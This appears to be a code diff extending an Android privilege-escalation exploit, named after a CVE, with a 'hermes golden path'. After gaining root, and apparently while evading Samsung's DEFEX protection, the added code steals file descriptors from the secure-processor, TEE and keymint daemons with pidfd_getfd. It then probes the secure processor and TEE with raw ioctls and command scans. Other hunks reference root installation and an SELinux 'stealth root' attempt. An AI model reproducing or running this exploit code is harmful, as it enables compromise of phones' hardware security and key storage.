@@ -9,6 +9,9 @@ int root_child_done;
 uint32_t root_uid_before = 0xffffffff;
 uint32_t root_uid_after = 0xffffffff;
 
+/* Forward declaration for hermes golden path */
+static void hermes_golden_path(void);
+
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 
 struct umh_subprocess_info {
@@ -446,9 +449,302 @@ static int install_workqueue_umh_root(int fd) {
     }
   }
 
+  /* === HERMES GOLDEN PATH — exec via su_daemon binary (--hermes flag) === */
+  if (socket_ok) {
+    pr_info("hermes: launching --hermes via su_daemon binary (real root + all caps)\n");
+    pid_t hp = fork();
+    if (hp == 0) {
+      execl(ROOT_UMH_PATH, "cve-2026-43499-root", "--hermes", (char *)NULL);
+      _exit(1);
+    }
+    if (hp > 0) {
+      int hst;
+      waitpid(hp, &hst, 0);
+      pr_info("hermes: --hermes exit=%d\n", WIFEXITED(hst) ? WEXITSTATUS(hst) : -1);
+    }
+  }
+
   root_child_done = socket_ok;
   root_uid_after = socket_ok ? 0 : root_uid_before;
   return socket_ok;
+}
+
+/* =================================================================
+ * HERMES GOLDEN PATH — Steal hermesd's spcom fd and probe SPU
+ * hermesd has /dev/spcom on fd 5, DMA heap on fd 7, qtee on fd 10
+ * This runs INSIDE GhostLock so DEFEX can't kill us!
+ *
+ * JackKnife Studios | Session 13 | Aug 25, 2026
+ * VIVA LA REVOLUTION
+ * ================================================================= */
+
+/* pidfd syscalls */
+#ifndef SYS_pidfd_open
+#define SYS_pidfd_open 434
+#endif
+#ifndef SYS_pidfd_getfd
+#define SYS_pidfd_getfd 438
+#endif
+
+/* SPCOM ioctl commands */
+#define SPCOM_GET_VERSION   0xC0095301
+#define SPCOM_IS_CONNECTED  0x80085302
+#define SPCOM_CMD16         0xC01053E8
+#define SPCOM_REGISTER      0x402053E9
+#define SPCOM_SEND_COMMAND  0x402853ED
+
+static pid_t find_pid(const char *name) {
+  DIR *d = opendir("/proc");
+  if (!d) return 0;
+  struct dirent *de;
+  pid_t found = 0;
+  while ((de = readdir(d)) != NULL) {
+    if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
+    char path[256], cmdline[256];
+    snprintf(path, sizeof(path), "/proc/%s/cmdline", de->d_name);
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) continue;
+    ssize_t n = read(fd, cmdline, sizeof(cmdline) - 1);
+    close(fd);
+    if (n <= 0) continue;
+    cmdline[n] = '\0';
+    if (strstr(cmdline, name)) {
+      found = atoi(de->d_name);
+      break;
+    }
+  }
+  closedir(d);
+  return found;
+}
+
+static int steal_fd(pid_t target, int target_fd) {
+  int pidfd = syscall(SYS_pidfd_open, target, 0);
+  if (pidfd < 0) return -1;
+  int fd = syscall(SYS_pidfd_getfd, pidfd, target_fd, 0);
+  close(pidfd);
+  return fd;
+}
+
+static void hermes_hexdump(FILE *f, const char *label,
+                           const void *data, size_t len) {
+  const uint8_t *p = data;
+  fprintf(f, "\n--- %s (%zu bytes) ---\n", label, len);
+  for (size_t i = 0; i < len && i < 256; i++) {
+    if (i % 16 == 0) fprintf(f, "  %04zx: ", i);
+    fprintf(f, "%02x ", p[i]);
+    if (i % 16 == 15 || i == len - 1) {
+      for (size_t j = (i % 16) + 1; j < 16; j++) fprintf(f, "   ");
+      fprintf(f, " | ");
+      size_t s = i - (i % 16);
+      for (size_t j = s; j <= i; j++)
+        fprintf(f, "%c", (p[j] >= 0x20 && p[j] < 0x7f) ? p[j] : '.');
+      fprintf(f, "\n");
+    }
+  }
+  if (len > 256) fprintf(f, "  ... (%zu more bytes)\n", len - 256);
+}
+
+static void hermes_golden_path(void) {
+  FILE *log = fopen("/data/local/tmp/hermes_golden.txt", "w");
+  if (!log) {
+    pr_info("hermes: can't open log file\n");
+    return;
+  }
+
+  fprintf(log, "╔══════════════════════════════════════════════╗\n");
+  fprintf(log, "║  HERMES GOLDEN PATH — JackKnife Studios     ║\n");
+  fprintf(log, "║  SPCOM Protocol Capture via fd-steal         ║\n");
+  fprintf(log, "║  VIVA LA REVOLUTION                         ║\n");
+  fprintf(log, "╚══════════════════════════════════════════════╝\n\n");
+
+  /* Find hermesd */
+  pid_t hermes_pid = find_pid("hermesd");
+  fprintf(log, "hermesd PID: %d\n", hermes_pid);
+  pr_info("hermes: PID=%d\n", hermes_pid);
+
+  if (!hermes_pid) {
+    fprintf(log, "[-] hermesd not found!\n");
+    fclose(log);
+    return;
+  }
+
+  /* Find ssgtzd too */
+  pid_t ssgtzd_pid = find_pid("ssgtzd");
+  fprintf(log, "ssgtzd PID: %d\n", ssgtzd_pid);
+
+  /* Find keymint-service-spu */
+  pid_t keymint_pid = find_pid("keymint-service-spu");
+  fprintf(log, "keymint-spu PID: %d\n\n", keymint_pid);
+
+  /* === STEAL HERMESD FDs === */
+  fprintf(log, "=== STEALING HERMESD FILE DESCRIPTORS ===\n");
+
+  int spcom_fd = steal_fd(hermes_pid, 5);   /* /dev/spcom */
+  int hermes_fd = steal_fd(hermes_pid, 6);  /* anon_inode:hermesd */
+  int dma_fd = steal_fd(hermes_pid, 7);     /* dma_heap */
+  int qtee_fd = steal_fd(hermes_pid, 10);   /* qtee */
+
+  fprintf(log, "  spcom fd 5 → local %d %s\n", spcom_fd,
+          spcom_fd >= 0 ? "OK" : strerror(errno));
+  fprintf(log, "  hermes fd 6 → local %d %s\n", hermes_fd,
+          hermes_fd >= 0 ? "OK" : strerror(errno));
+  fprintf(log, "  dma fd 7 → local %d %s\n", dma_fd,
+          dma_fd >= 0 ? "OK" : strerror(errno));
+  fprintf(log, "  qtee fd 10 → local %d %s\n\n", qtee_fd,
+          qtee_fd >= 0 ? "OK" : strerror(errno));
+
+  pr_info("hermes: stolen fds spcom=%d hermes=%d dma=%d qtee=%d\n",
+          spcom_fd, hermes_fd, dma_fd, qtee_fd);
+
+  /* === PROBE SPCOM FD === */
+  if (spcom_fd >= 0) {
+    fprintf(log, "=== SPCOM FD PROBING (stolen from hermesd) ===\n");
+
+    /* GET_VERSION */
+    uint8_t ver[16] = {0};
+    int rc = ioctl(spcom_fd, SPCOM_GET_VERSION, ver);
+    fprintf(log, "GET_VERSION: rc=%d errno=%d\n", rc, errno);
+    if (rc >= 0) hermes_hexdump(log, "SPU VERSION", ver, 16);
+
+    /* IS_CONNECTED */
+    uint8_t conn[16] = {0};
+    rc = ioctl(spcom_fd, SPCOM_IS_CONNECTED, conn);
+    fprintf(log, "IS_CONNECTED: rc=%d errno=%d\n", rc, errno);
+    if (rc >= 0) hermes_hexdump(log, "CONNECTED", conn, 16);
+
+    /* CMD16 with cmd=0x64 (the one that responds) */
+    uint8_t cmd16[16] = {0};
+    cmd16[0] = 0x64;
+    rc = ioctl(spcom_fd, SPCOM_CMD16, cmd16);
+    fprintf(log, "CMD16(0x64): rc=%d errno=%d\n", rc, errno);
+    hermes_hexdump(log, "CMD16 RESPONSE", cmd16, 16);
+
+    /* Try reading pending data (non-blocking) */
+    int flags = fcntl(spcom_fd, F_GETFL);
+    fcntl(spcom_fd, F_SETFL, flags | O_NONBLOCK);
+    uint8_t rbuf[4096];
+    ssize_t n = read(spcom_fd, rbuf, sizeof(rbuf));
+    fprintf(log, "read(): %zd errno=%d\n", n, errno);
+    if (n > 0) hermes_hexdump(log, "PENDING SPCOM DATA", rbuf, n);
+    fcntl(spcom_fd, F_SETFL, flags); /* restore */
+
+    /* Try REGISTER as a new channel name */
+    struct {
+      char name[32];
+    } reg = {0};
+    strncpy(reg.name, "sp_hermes_jk", sizeof(reg.name));
+    rc = ioctl(spcom_fd, SPCOM_REGISTER, &reg);
+    fprintf(log, "REGISTER 'sp_hermes_jk': rc=%d errno=%d\n", rc, errno);
+
+    /* Probe additional CMD16 commands */
+    fprintf(log, "\n=== CMD16 COMMAND SCAN ===\n");
+    for (int cmd = 0; cmd < 16; cmd++) {
+      uint8_t probe[16] = {0};
+      probe[0] = cmd;
+      /* Use alarm to prevent D-state hang */
+      alarm(3);
+      rc = ioctl(spcom_fd, SPCOM_CMD16, probe);
+      alarm(0);
+      if (rc >= 0 || errno != EINTR) {
+        fprintf(log, "  CMD16[0x%02x]: rc=%d errno=%d", cmd, rc, errno);
+        if (rc >= 0 && (probe[0] || probe[1] || probe[2] || probe[3])) {
+          fprintf(log, " → %02x%02x%02x%02x %02x%02x%02x%02x",
+                  probe[0], probe[1], probe[2], probe[3],
+                  probe[4], probe[5], probe[6], probe[7]);
+        }
+        fprintf(log, "\n");
+      } else {
+        fprintf(log, "  CMD16[0x%02x]: TIMEOUT (alarm)\n", cmd);
+      }
+    }
+
+    close(spcom_fd);
+    fprintf(log, "\n");
+  }
+
+  /* === PROBE HERMESD ANON FD === */
+  if (hermes_fd >= 0) {
+    fprintf(log, "=== HERMESD ANON FD PROBING ===\n");
+
+    /* Try basic ioctls */
+    uint8_t buf[256] = {0};
+    int rc = ioctl(hermes_fd, 0xC0095301, buf);  /* GET_VERSION on hermes? */
+    fprintf(log, "hermes GET_VERSION: rc=%d errno=%d\n", rc, errno);
+
+    rc = ioctl(hermes_fd, 0x80085302, buf);  /* IS_CONNECTED? */
+    fprintf(log, "hermes IS_CONNECTED: rc=%d errno=%d\n", rc, errno);
+
+    /* Try reading */
+    int flags = fcntl(hermes_fd, F_GETFL);
+    fcntl(hermes_fd, F_SETFL, flags | O_NONBLOCK);
+    ssize_t n = read(hermes_fd, buf, sizeof(buf));
+    fprintf(log, "hermes read(): %zd errno=%d\n", n, errno);
+    if (n > 0) hermes_hexdump(log, "HERMES DATA", buf, n);
+    fcntl(hermes_fd, F_SETFL, flags);
+
+    close(hermes_fd);
+    fprintf(log, "\n");
+  }
+
+  /* === PROBE QTEE FD === */
+  if (qtee_fd >= 0) {
+    fprintf(log, "=== QTEE FD PROBING ===\n");
+
+    /* smcinvoke probe - op=0 with no args (safe) */
+    uint8_t invoke[256] = {0};
+    int rc = ioctl(qtee_fd, 0xC0106900, invoke);
+    fprintf(log, "SMCINVOKE_INVOKE: rc=%d errno=%d\n", rc, errno);
+    if (rc >= 0) hermes_hexdump(log, "SMCINVOKE RESPONSE", invoke, 64);
+
+    close(qtee_fd);
+    fprintf(log, "\n");
+  }
+
+  /* === ALSO STEAL FROM ssgtzd AND keymint-spu === */
+  if (ssgtzd_pid) {
+    fprintf(log, "=== ssgtzd FD STEAL ===\n");
+    /* ssgtzd fd 4 is primary spcom */
+    int ssg_spcom = steal_fd(ssgtzd_pid, 4);
+    fprintf(log, "ssgtzd fd 4 → local %d %s\n", ssg_spcom,
+            ssg_spcom >= 0 ? "OK" : strerror(errno));
+    if (ssg_spcom >= 0) {
+      uint8_t ver[16] = {0};
+      int rc = ioctl(ssg_spcom, SPCOM_GET_VERSION, ver);
+      fprintf(log, "  GET_VERSION: rc=%d\n", rc);
+      if (rc >= 0) hermes_hexdump(log, "ssgtzd SPU VERSION", ver, 16);
+
+      uint8_t conn[16] = {0};
+      rc = ioctl(ssg_spcom, SPCOM_IS_CONNECTED, conn);
+      fprintf(log, "  IS_CONNECTED: rc=%d\n", rc);
+      if (rc >= 0) hermes_hexdump(log, "ssgtzd CONNECTED", conn, 16);
+
+      close(ssg_spcom);
+    }
+    fprintf(log, "\n");
+  }
+
+  if (keymint_pid) {
+    fprintf(log, "=== keymint-spu FD STEAL ===\n");
+    /* keymint-spu uses qtee fds 10-15 */
+    for (int tfd = 10; tfd <= 15; tfd++) {
+      int stolen = steal_fd(keymint_pid, tfd);
+      if (stolen >= 0) {
+        fprintf(log, "keymint fd %d → local %d\n", tfd, stolen);
+        /* Quick smcinvoke probe */
+        uint8_t buf[64] = {0};
+        int rc = ioctl(stolen, 0xC0106900, buf);
+        fprintf(log, "  SMCINVOKE: rc=%d errno=%d\n", rc, errno);
+        close(stolen);
+      }
+    }
+    fprintf(log, "\n");
+  }
+
+  fprintf(log, "=== HERMES GOLDEN PATH COMPLETE ===\n");
+  fprintf(log, "VIVA LA REVOLUTION\n");
+  fclose(log);
+
+  pr_info("hermes: golden path results in /data/local/tmp/hermes_golden.txt\n");
 }
 
 /* SPCOM channel state dump + reset — for second-run mode */
@@ -550,6 +846,10 @@ int install_android_root(int fd) {
 
     /* Dump spcom driver state */
     dump_spcom_state(fd);
+
+    /* HERMES GOLDEN PATH — steal hermesd fds and probe SPU */
+    pr_info("hermes: launching golden path (second-run mode)\n");
+    hermes_golden_path();
 
     /* AVC stealth root attempt */
     uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
